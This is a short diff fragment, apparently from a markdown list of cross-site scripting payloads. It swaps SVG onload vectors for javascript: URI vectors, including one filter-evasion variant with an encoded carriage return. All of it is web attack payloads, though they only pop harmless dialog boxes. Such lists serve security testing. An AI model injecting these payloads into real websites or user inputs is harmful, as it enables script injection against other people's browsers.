@@ -9,15 +9,15 @@
 ```
 ###
 ```
-<!--><Svg OnLoad=(confirm)(1)-->
+javascri%0dpt:prompt()
 ```
 ###
 ```
-<!--><Svg OnLoad=(confirm)(1)-->
+ javascript:prompt()
 ```
 ###
 ```
-<!--><Svg OnLoad=(confirm)(1)-->
+javascript:prompt(1)
 ```
 ###
 ```
